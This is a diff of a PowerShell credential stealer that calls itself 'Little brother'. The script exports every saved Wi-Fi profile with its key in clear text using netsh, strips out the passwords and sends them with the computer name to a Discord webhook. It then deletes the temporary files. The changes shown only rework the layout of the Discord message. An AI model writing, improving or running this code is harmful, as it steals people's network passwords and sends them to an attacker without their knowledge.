@@ -21,25 +21,25 @@ param (
 )
 
 [System.Collections.ArrayList]$embedArray = @()
-[System.Collections.ArrayList]$fieldsArray = @()
 
 $forEmbed =  [PSCustomObject]@{
     'title'       = 'Incoming transmission!'
-    'description' = '[Saved Wifi Password - ' + $env:computername + '] ' + 'Little brother is reporting: ' + $test
+    'description' = '[Saved Wifi Password - ' + $env:computername + '] ' + 'Little brother is reporting: ' 
     'color'       = '16744960'
+    'fields'   = @(@{
+    'name'    = "Uh?"
+    'value' = $loggedwifis    
+    })
 }
 
-$forFields = [PSCustomObject]@{
-    'value' = $loggedwifis
-}
+
 
 $embedArray.Add($ForEmbed) | Out-Null
-$fieldsArray.Add($forFields) | Out-Null
 
 $Body = [PSCustomObject]@{
 
     embeds = $embedArray
-    fields = $fieldsArray
+
 }
 
 if (-not ([string]::IsNullOrEmpty($text))){
@@ -54,7 +54,6 @@ Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=c
 $originalOutput = Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} 
 $touchedOutput = $originalOutput.Replace("C:\Users\$env:username\AppData\Local\Temp\js2k3kd4nne5dhsk\Wi-Fi-", "")
 $loggedwifis = $touchedOutput -replace "\.xml:.*?\:"
-$test = $loggedwifis | Format-Table | Out-String
 Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"
 Set-Location -Path "$env:temp"
 Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse
